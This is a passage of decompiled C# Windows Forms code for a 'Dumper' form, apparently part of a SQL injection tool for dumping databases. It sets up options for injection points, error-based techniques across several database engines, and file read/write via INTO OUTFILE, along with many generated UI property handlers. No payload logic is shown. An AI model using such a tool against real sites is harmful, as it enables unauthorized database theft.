using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using Taskbar;

// Token: 0x02000072 RID: 114
[DesignerGenerated]
public partial class Dumper : Form
{
	// Token: 0x0600045B RID: 1115 RVA: 0x00018C9C File Offset: 0x00016E9C
	public Dumper()
	{
		base.Load += this.Dumper_Load;
		base.FormClosing += this.Dumper_FormClosing;
		this.string_0 = "";
		this.string_2 = "retry limit exceeded";
		this.string_3 = "canceled by user";
		this.string_4 = "Loading please wait..";
		this.list_1 = new List<DumpGrid>();
		this.InitializeComponent();
		this.grbInjectionPoint.Visible = false;
		this.cmbSqlType.Items.Add(Class54.smethod_5(Types.MySQL_No_Error));
		this.cmbSqlType.Items.Add(Class54.smethod_5(Types.MySQL_With_Error));
		this.cmbSqlType.Items.Add(Class54.smethod_5(Types.MSSQL_No_Error));
		this.cmbSqlType.Items.Add(Class54.smethod_5(Types.MSSQL_With_Error));
		this.cmbSqlType.Items.Add(Class54.smethod_5(Types.Oracle_No_Error));
		this.cmbSqlType.Items.Add(Class54.smethod_5(Types.Oracle_With_Error));
		this.cmbSqlType.Items.Add(Class54.smethod_5(Types.PostgreSQL_No_Error));
		this.cmbSqlType.Items.Add(Class54.smethod_5(Types.PostgreSQL_With_Error));
		this.cmbSqlType.SelectedIndex = 0;
		this.cmbMySQLCollations.Items.AddRange(new string[] { "None", "Unhex(Hex())", "Binary()", "Cast As Char", "Compress(Uncompress())", "Convert Using utf8", "Convert Using latin1", "Aes_decrypt(Aes_encrypt())" });
		this.cmbMySQLCollations.SelectedIndex = 1;
		this.cmbMySQLErrType.Items.AddRange(new string[] { "XPATH - UpdateXML", "Double Query", "XPATH - ExtractValue" });
		this.cmbMySQLErrType.SelectedIndex = 1;
		this.cmbOracleTopN.Items.AddRange(new string[] { "ROWNUM", "RANK()", "DENSE_RANK()" });
		this.cmbOracleTopN.SelectedIndex = 0;
		this.cmbOracleErrType.Items.AddRange(new string[] { "GET_HOST_ADDRESS", "DRITHSX.SN", "GETMAPPINGXPATH" });
		this.cmbOracleErrType.SelectedIndex = 0;
		this.cmbMSSQLCast.Items.AddRange(new string[] { "nvarchar", "nvarchar(4000)", "char", "char(4000)", "varchar", "varchar(4000)", "nchar", "nchar(4000)" });
		this.cmbMSSQLCast.SelectedIndex = 0;
		this.cmbMySQLWriteFilePath.Items.AddRange(new string[] { "INTO OUTFILE", "INTO DUMPFILE" });
		this.cmbMySQLWriteFilePath.SelectedIndex = 0;
		this.cmbMySQLReadFile.Items.AddRange(new string[] { "NONE", "HEX", "CHAR" });
		this.cmbMySQLReadFile.SelectedIndex = 1;
		this.lblVersion.Text = "";
		this.lblCountry.Text = "";
		this.tabControlExt_0 = new TabControlExt();
		this.splData.Panel2.Controls.Add(this.tabControlExt_0);
		this.tabControlExt_0.BorderColorDisabled = SystemColors.Control;
		this.tabControlExt_0.Dock = DockStyle.Fill;
		this.tabControlExt_0.Font = new Font("Courier New", 8f, FontStyle.Regular);
		TabControlExt tabControlExt;
		(tabControlExt = this.tabControlExt_0).TabHeight = checked(tabControlExt.TabHeight - 7);
		this.tabControlExt_0.GetBackground().MouseDown += global::Globals.AddMouseMove;
		this.tabControlExt_0.pnlTabs.MouseDown += global::Globals.AddMouseMove;
		this.tabControlExt_0.TabPages.OnVisibleChanged += this.method_38;
		this.splData.Panel2Collapsed = true;
		this.cmbMethod.Items.Add("GET");
		this.cmbMethod.Items.Add("POST");
		this.cmbMethod.Text = Conversions.ToString(this.cmbMethod.Items[0]);
		this.cmbInjectionPoint.Items.Add("URL");
		this.cmbInjectionPoint.Items.Add("Cookies");
		this.cmbInjectionPoint.Items.Add("POST");
		this.cmbInjectionPoint.Items.Add("Added Header");
		this.cmbInjectionPoint.Text = Conversions.ToString(this.cmbInjectionPoint.Items[0]);
		this.cmbMSSQLCast.Items.Add("nvarchar");
		this.cmbMSSQLCast.Items.Add("nvarchar(4000)");
		this.cmbMSSQLCast.Items.Add("char");
		this.cmbMSSQLCast.Items.Add("char(4000)");
		this.cmbMSSQLCast.Items.Add("varchar");
		this.cmbMSSQLCast.Items.Add("varchar(4000)");
		this.cmbMSSQLCast.Items.Add("nchar");
		this.cmbMSSQLCast.Items.Add("nchar(4000)");
		this.cmbMSSQLCast.SelectedIndex = 0;
		this.tabControlExt_0.RenderMode = ToolStripRenderMode.System;
		this.btnDataBases.Image = this.imgTV.Images[0];
		this.btnTables.Image = this.imgTV.Images[1];
		this.btnColumns.Image = this.imgTV.Images[2];
		this.splSchema.Panel2Collapsed = true;
		if (global::Globals.IS_DUMP_INSTANCE)
		{
			this.btnLoadDefautSettings.Visible = false;
			this.tsNewDumpBtn.Visible = false;
			if (File.Exists(global::Globals.SCHEMA_PATH + "AppInstencie.Schema"))
			{
				this.method_79("AppInstencie.Schema");
			}
		}
		else
		{
			this.tbcMain.TabPages.Remove(this.tpProxies);
		}
		this.txtURL = new ToolStripSpringTextBox(0);
		this.tlsMenu.Items.Insert(2, this.txtURL);
		global::Globals.AddMouseMoveForm(this);
		this.method_77();
		global::Globals.translate_0.Add(this, this.icontainer_0);
	}

	// Token: 0x17000143 RID: 323
	// (get) Token: 0x0600045E RID: 1118 RVA: 0x00021628 File Offset: 0x0001F828
	// (set) Token: 0x0600045F RID: 1119 RVA: 0x00021630 File Offset: 0x0001F830
	internal virtual ToolStrip tsGetInfo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000144 RID: 324
	// (get) Token: 0x06000460 RID: 1120 RVA: 0x0002163C File Offset: 0x0001F83C
	// (set) Token: 0x06000461 RID: 1121 RVA: 0x00021644 File Offset: 0x0001F844
	internal virtual ToolStripComboBox tscSchemas
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000145 RID: 325
	// (get) Token: 0x06000462 RID: 1122 RVA: 0x00021650 File Offset: 0x0001F850
	// (set) Token: 0x06000463 RID: 1123 RVA: 0x00021658 File Offset: 0x0001F858
	internal virtual ToolStripButton tsbSchemas_0
	{
		[CompilerGenerated]
		get
		{
			return this._tsbSchemas_0;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_83);
			ToolStripButton toolStripButton = this._tsbSchemas_0;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._tsbSchemas_0 = value;
			toolStripButton = this._tsbSchemas_0;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000146 RID: 326
	// (get) Token: 0x06000464 RID: 1124 RVA: 0x0002169C File Offset: 0x0001F89C
	// (set) Token: 0x06000465 RID: 1125 RVA: 0x000216A4 File Offset: 0x0001F8A4
	internal virtual ToolStripSeparator tscSchemasSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000147 RID: 327
	// (get) Token: 0x06000466 RID: 1126 RVA: 0x000216B0 File Offset: 0x0001F8B0
	// (set) Token: 0x06000467 RID: 1127 RVA: 0x000216B8 File Offset: 0x0001F8B8
	internal virtual ToolStripButton tsbSchemas_1
	{
		[CompilerGenerated]
		get
		{
			return this._tsbSchemas_1;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_84);
			ToolStripButton toolStripButton = this._tsbSchemas_1;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._tsbSchemas_1 = value;
			toolStripButton = this._tsbSchemas_1;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000148 RID: 328
	// (get) Token: 0x06000468 RID: 1128 RVA: 0x000216FC File Offset: 0x0001F8FC
	// (set) Token: 0x06000469 RID: 1129 RVA: 0x00021704 File Offset: 0x0001F904
	internal virtual ToolStripButton tsbSchemas_2
	{
		[CompilerGenerated]
		get
		{
			return this._tsbSchemas_2;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_85);
			ToolStripButton toolStripButton = this._tsbSchemas_2;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._tsbSchemas_2 = value;
			toolStripButton = this._tsbSchemas_2;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000149 RID: 329
	// (get) Token: 0x0600046A RID: 1130 RVA: 0x00021748 File Offset: 0x0001F948
	// (set) Token: 0x0600046B RID: 1131 RVA: 0x00021750 File Offset: 0x0001F950
	internal virtual ToolStripSeparator tscSchemasSP1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700014A RID: 330
	// (get) Token: 0x0600046C RID: 1132 RVA: 0x0002175C File Offset: 0x0001F95C
	// (set) Token: 0x0600046D RID: 1133 RVA: 0x00021764 File Offset: 0x0001F964
	internal virtual ToolStripButton btnServerInfo
	{
		[CompilerGenerated]
		get
		{
			return this._btnServerInfo;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_90);
			ToolStripButton toolStripButton = this._btnServerInfo;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnServerInfo = value;
			toolStripButton = this._btnServerInfo;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700014B RID: 331
	// (get) Token: 0x0600046E RID: 1134 RVA: 0x000217A8 File Offset: 0x0001F9A8
	// (set) Token: 0x0600046F RID: 1135 RVA: 0x000217B0 File Offset: 0x0001F9B0
	public virtual ToolStripButton tsbSchemas_3
	{
		[CompilerGenerated]
		get
		{
			return this._tsbSchemas_3;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_86);
			ToolStripButton toolStripButton = this._tsbSchemas_3;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._tsbSchemas_3 = value;
			toolStripButton = this._tsbSchemas_3;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700014C RID: 332
	// (get) Token: 0x06000470 RID: 1136 RVA: 0x000217F4 File Offset: 0x0001F9F4
	// (set) Token: 0x06000471 RID: 1137 RVA: 0x000217FC File Offset: 0x0001F9FC
	internal virtual TabControl tbcMain
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700014D RID: 333
	// (get) Token: 0x06000472 RID: 1138 RVA: 0x00021808 File Offset: 0x0001FA08
	// (set) Token: 0x06000473 RID: 1139 RVA: 0x00021810 File Offset: 0x0001FA10
	internal virtual TabPage tpSchema
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700014E RID: 334
	// (get) Token: 0x06000474 RID: 1140 RVA: 0x0002181C File Offset: 0x0001FA1C
	// (set) Token: 0x06000475 RID: 1141 RVA: 0x00021824 File Offset: 0x0001FA24
	internal virtual SplitContainer splSchema
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700014F RID: 335
	// (get) Token: 0x06000476 RID: 1142 RVA: 0x00021830 File Offset: 0x0001FA30
	// (set) Token: 0x06000477 RID: 1143 RVA: 0x00021838 File Offset: 0x0001FA38
	internal virtual TreeViewExt trwSchema
	{
		[CompilerGenerated]
		get
		{
			return this._trwSchema;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			TreeViewEventHandler treeViewEventHandler = new TreeViewEventHandler(this.method_55);
			TreeViewEventHandler treeViewEventHandler2 = new TreeViewEventHandler(this.method_56);
			KeyEventHandler keyEventHandler = new KeyEventHandler(this.method_57);
			TreeNodeMouseClickEventHandler treeNodeMouseClickEventHandler = new TreeNodeMouseClickEventHandler(this.method_151);
			TreeViewExt treeViewExt = this._trwSchema;
			if (treeViewExt != null)
			{
				treeViewExt.AfterCheck -= treeViewEventHandler;
				treeViewExt.AfterSelect -= treeViewEventHandler2;
				treeViewExt.KeyUp -= keyEventHandler;
				treeViewExt.NodeMouseClick -= treeNodeMouseClickEventHandler;
			}
			this._trwSchema = value;
			treeViewExt = this._trwSchema;
			if (treeViewExt != null)
			{
				treeViewExt.AfterCheck += treeViewEventHandler;
				treeViewExt.AfterSelect += treeViewEventHandler2;
				treeViewExt.KeyUp += keyEventHandler;
				treeViewExt.NodeMouseClick += treeNodeMouseClickEventHandler;
			}
		}
	}

	// Token: 0x17000150 RID: 336
	// (get) Token: 0x06000478 RID: 1144 RVA: 0x000218D8 File Offset: 0x0001FAD8
	// (set) Token: 0x06000479 RID: 1145 RVA: 0x000218E0 File Offset: 0x0001FAE0
	internal virtual GroupBox grbWhere
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000151 RID: 337
	// (get) Token: 0x0600047A RID: 1146 RVA: 0x000218EC File Offset: 0x0001FAEC
	// (set) Token: 0x0600047B RID: 1147 RVA: 0x000218F4 File Offset: 0x0001FAF4
	internal virtual TextBox txtSchemaWhere
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000152 RID: 338
	// (get) Token: 0x0600047C RID: 1148 RVA: 0x00021900 File Offset: 0x0001FB00
	// (set) Token: 0x0600047D RID: 1149 RVA: 0x00021908 File Offset: 0x0001FB08
	internal virtual ToolStrip tsConvert1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000153 RID: 339
	// (get) Token: 0x0600047E RID: 1150 RVA: 0x00021914 File Offset: 0x0001FB14
	// (set) Token: 0x0600047F RID: 1151 RVA: 0x0002191C File Offset: 0x0001FB1C
	internal virtual ToolStripButton btnFiltersClear1
	{
		[CompilerGenerated]
		get
		{
			return this._btnFiltersClear1;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_121);
			ToolStripButton toolStripButton = this._btnFiltersClear1;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnFiltersClear1 = value;
			toolStripButton = this._btnFiltersClear1;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000154 RID: 340
	// (get) Token: 0x06000480 RID: 1152 RVA: 0x00021960 File Offset: 0x0001FB60
	// (set) Token: 0x06000481 RID: 1153 RVA: 0x00021968 File Offset: 0x0001FB68
	internal virtual ToolStripDropDownButton btnConvert
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000155 RID: 341
	// (get) Token: 0x06000482 RID: 1154 RVA: 0x00021974 File Offset: 0x0001FB74
	// (set) Token: 0x06000483 RID: 1155 RVA: 0x0002197C File Offset: 0x0001FB7C
	internal virtual ToolStripDropDownButton ToolStripDropDownButton1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000156 RID: 342
	// (get) Token: 0x06000484 RID: 1156 RVA: 0x00021988 File Offset: 0x0001FB88
	// (set) Token: 0x06000485 RID: 1157 RVA: 0x00021990 File Offset: 0x0001FB90
	internal virtual GroupBox grbOrderBy
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000157 RID: 343
	// (get) Token: 0x06000486 RID: 1158 RVA: 0x0002199C File Offset: 0x0001FB9C
	// (set) Token: 0x06000487 RID: 1159 RVA: 0x000219A4 File Offset: 0x0001FBA4
	internal virtual TextBox txtSchemaOrderBy
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000158 RID: 344
	// (get) Token: 0x06000488 RID: 1160 RVA: 0x000219B0 File Offset: 0x0001FBB0
	// (set) Token: 0x06000489 RID: 1161 RVA: 0x000219B8 File Offset: 0x0001FBB8
	internal virtual ToolStrip tsSchema
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000159 RID: 345
	// (get) Token: 0x0600048A RID: 1162 RVA: 0x000219C4 File Offset: 0x0001FBC4
	// (set) Token: 0x0600048B RID: 1163 RVA: 0x000219CC File Offset: 0x0001FBCC
	internal virtual ToolStripLabel lblCountBDs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700015A RID: 346
	// (get) Token: 0x0600048C RID: 1164 RVA: 0x000219D8 File Offset: 0x0001FBD8
	// (set) Token: 0x0600048D RID: 1165 RVA: 0x000219E0 File Offset: 0x0001FBE0
	internal virtual ToolStripSeparator ToolStripSeparator22
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700015B RID: 347
	// (get) Token: 0x0600048E RID: 1166 RVA: 0x000219EC File Offset: 0x0001FBEC
	// (set) Token: 0x0600048F RID: 1167 RVA: 0x000219F4 File Offset: 0x0001FBF4
	internal virtual ToolStripButton btnClearSchema
	{
		[CompilerGenerated]
		get
		{
			return this._btnClearSchema;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_67);
			ToolStripButton toolStripButton = this._btnClearSchema;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnClearSchema = value;
			toolStripButton = this._btnClearSchema;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700015C RID: 348
	// (get) Token: 0x06000490 RID: 1168 RVA: 0x00021A38 File Offset: 0x0001FC38
	// (set) Token: 0x06000491 RID: 1169 RVA: 0x00021A40 File Offset: 0x0001FC40
	internal virtual ToolStripSeparator ToolStripSeparator13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700015D RID: 349
	// (get) Token: 0x06000492 RID: 1170 RVA: 0x00021A4C File Offset: 0x0001FC4C
	// (set) Token: 0x06000493 RID: 1171 RVA: 0x00021A54 File Offset: 0x0001FC54
	internal virtual ToolStripButton btnDataBases
	{
		[CompilerGenerated]
		get
		{
			return this._btnDataBases;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_91);
			ToolStripButton toolStripButton = this._btnDataBases;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnDataBases = value;
			toolStripButton = this._btnDataBases;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700015E RID: 350
	// (get) Token: 0x06000494 RID: 1172 RVA: 0x00021A98 File Offset: 0x0001FC98
	// (set) Token: 0x06000495 RID: 1173 RVA: 0x00021AA0 File Offset: 0x0001FCA0
	internal virtual ToolStripSeparator ToolStripSeparator5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700015F RID: 351
	// (get) Token: 0x06000496 RID: 1174 RVA: 0x00021AAC File Offset: 0x0001FCAC
	// (set) Token: 0x06000497 RID: 1175 RVA: 0x00021AB4 File Offset: 0x0001FCB4
	internal virtual ToolStripButton btnTables
	{
		[CompilerGenerated]
		get
		{
			return this._btnTables;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_92);
			ToolStripButton toolStripButton = this._btnTables;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnTables = value;
			toolStripButton = this._btnTables;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000160 RID: 352
	// (get) Token: 0x06000498 RID: 1176 RVA: 0x00021AF8 File Offset: 0x0001FCF8
	// (set) Token: 0x06000499 RID: 1177 RVA: 0x00021B00 File Offset: 0x0001FD00
	internal virtual ToolStripButton btnColumns
	{
		[CompilerGenerated]
		get
		{
			return this._btnColumns;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_93);
			ToolStripButton toolStripButton = this._btnColumns;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnColumns = value;
			toolStripButton = this._btnColumns;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000161 RID: 353
	// (get) Token: 0x0600049A RID: 1178 RVA: 0x00021B44 File Offset: 0x0001FD44
	// (set) Token: 0x0600049B RID: 1179 RVA: 0x00021B4C File Offset: 0x0001FD4C
	internal virtual ToolStripButton btnDumpData
	{
		[CompilerGenerated]
		get
		{
			return this._btnDumpData;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_94);
			ToolStripButton toolStripButton = this._btnDumpData;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnDumpData = value;
			toolStripButton = this._btnDumpData;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000162 RID: 354
	// (get) Token: 0x0600049C RID: 1180 RVA: 0x00021B90 File Offset: 0x0001FD90
	// (set) Token: 0x0600049D RID: 1181 RVA: 0x00021B98 File Offset: 0x0001FD98
	internal virtual ToolStripButton btnColumnUp
	{
		[CompilerGenerated]
		get
		{
			return this._btnColumnUp;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_96);
			ToolStripButton toolStripButton = this._btnColumnUp;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnColumnUp = value;
			toolStripButton = this._btnColumnUp;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000163 RID: 355
	// (get) Token: 0x0600049E RID: 1182 RVA: 0x00021BDC File Offset: 0x0001FDDC
	// (set) Token: 0x0600049F RID: 1183 RVA: 0x00021BE4 File Offset: 0x0001FDE4
	internal virtual ToolStripButton btnColumnDown
	{
		[CompilerGenerated]
		get
		{
			return this._btnColumnDown;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_96);
			ToolStripButton toolStripButton = this._btnColumnDown;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnColumnDown = value;
			toolStripButton = this._btnColumnDown;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000164 RID: 356
	// (get) Token: 0x060004A0 RID: 1184 RVA: 0x00021C28 File Offset: 0x0001FE28
	// (set) Token: 0x060004A1 RID: 1185 RVA: 0x00021C30 File Offset: 0x0001FE30
	internal virtual TabPage tpQuery
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000165 RID: 357
	// (get) Token: 0x060004A2 RID: 1186 RVA: 0x00021C3C File Offset: 0x0001FE3C
	// (set) Token: 0x060004A3 RID: 1187 RVA: 0x00021C44 File Offset: 0x0001FE44
	internal virtual SplitContainer splQuery
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000166 RID: 358
	// (get) Token: 0x060004A4 RID: 1188 RVA: 0x00021C50 File Offset: 0x0001FE50
	// (set) Token: 0x060004A5 RID: 1189 RVA: 0x00021C58 File Offset: 0x0001FE58
	internal virtual TextBox txtCustomQuery
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000167 RID: 359
	// (get) Token: 0x060004A6 RID: 1190 RVA: 0x00021C64 File Offset: 0x0001FE64
	// (set) Token: 0x060004A7 RID: 1191 RVA: 0x00021C6C File Offset: 0x0001FE6C
	internal virtual Label lblSelect
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000168 RID: 360
	// (get) Token: 0x060004A8 RID: 1192 RVA: 0x00021C78 File Offset: 0x0001FE78
	// (set) Token: 0x060004A9 RID: 1193 RVA: 0x00021C80 File Offset: 0x0001FE80
	internal virtual TextBox txtCustomQueryFrom
	{
		[CompilerGenerated]
		get
		{
			return this._txtCustomQueryFrom;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_102);
			TextBox textBox = this._txtCustomQueryFrom;
			if (textBox != null)
			{
				textBox.TextChanged -= eventHandler;
			}
			this._txtCustomQueryFrom = value;
			textBox = this._txtCustomQueryFrom;
			if (textBox != null)
			{
				textBox.TextChanged += eventHandler;
			}
		}
	}

	// Token: 0x17000169 RID: 361
	// (get) Token: 0x060004AA RID: 1194 RVA: 0x00021CC4 File Offset: 0x0001FEC4
	// (set) Token: 0x060004AB RID: 1195 RVA: 0x00021CCC File Offset: 0x0001FECC
	internal virtual Label lblFrom
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700016A RID: 362
	// (get) Token: 0x060004AC RID: 1196 RVA: 0x00021CD8 File Offset: 0x0001FED8
	// (set) Token: 0x060004AD RID: 1197 RVA: 0x00021CE0 File Offset: 0x0001FEE0
	internal virtual ToolStrip tsCustomDump
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700016B RID: 363
	// (get) Token: 0x060004AE RID: 1198 RVA: 0x00021CEC File Offset: 0x0001FEEC
	// (set) Token: 0x060004AF RID: 1199 RVA: 0x00021CF4 File Offset: 0x0001FEF4
	internal virtual ToolStripButton btnDumpCustom
	{
		[CompilerGenerated]
		get
		{
			return this._btnDumpCustom;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_95);
			ToolStripButton toolStripButton = this._btnDumpCustom;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnDumpCustom = value;
			toolStripButton = this._btnDumpCustom;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700016C RID: 364
	// (get) Token: 0x060004B0 RID: 1200 RVA: 0x00021D38 File Offset: 0x0001FF38
	// (set) Token: 0x060004B1 RID: 1201 RVA: 0x00021D40 File Offset: 0x0001FF40
	internal virtual ToolStripButton btnDefCustomQuery
	{
		[CompilerGenerated]
		get
		{
			return this._btnDefCustomQuery;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_103);
			ToolStripButton toolStripButton = this._btnDefCustomQuery;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnDefCustomQuery = value;
			toolStripButton = this._btnDefCustomQuery;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700016D RID: 365
	// (get) Token: 0x060004B2 RID: 1202 RVA: 0x00021D84 File Offset: 0x0001FF84
	// (set) Token: 0x060004B3 RID: 1203 RVA: 0x00021D8C File Offset: 0x0001FF8C
	internal virtual ToolStripSeparator ToolStripSeparator19
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700016E RID: 366
	// (get) Token: 0x060004B4 RID: 1204 RVA: 0x00021D98 File Offset: 0x0001FF98
	// (set) Token: 0x060004B5 RID: 1205 RVA: 0x00021DA0 File Offset: 0x0001FFA0
	internal virtual ToolStripDropDownButton mnuTemplates
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700016F RID: 367
	// (get) Token: 0x060004B6 RID: 1206 RVA: 0x00021DAC File Offset: 0x0001FFAC
	// (set) Token: 0x060004B7 RID: 1207 RVA: 0x00021DB4 File Offset: 0x0001FFB4
	internal virtual ToolStripSeparator ToolStripSeparator9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000170 RID: 368
	// (get) Token: 0x060004B8 RID: 1208 RVA: 0x00021DC0 File Offset: 0x0001FFC0
	// (set) Token: 0x060004B9 RID: 1209 RVA: 0x00021DC8 File Offset: 0x0001FFC8
	internal virtual ToolStripDropDownButton mnuConvert
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000171 RID: 369
	// (get) Token: 0x060004BA RID: 1210 RVA: 0x00021DD4 File Offset: 0x0001FFD4
	// (set) Token: 0x060004BB RID: 1211 RVA: 0x00021DDC File Offset: 0x0001FFDC
	internal virtual CheckBox chkMSSQLCastAsChar
	{
		[CompilerGenerated]
		get
		{
			return this._chkMSSQLCastAsChar;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_97);
			CheckBox checkBox = this._chkMSSQLCastAsChar;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= eventHandler;
			}
			this._chkMSSQLCastAsChar = value;
			checkBox = this._chkMSSQLCastAsChar;
			if (checkBox != null)
			{
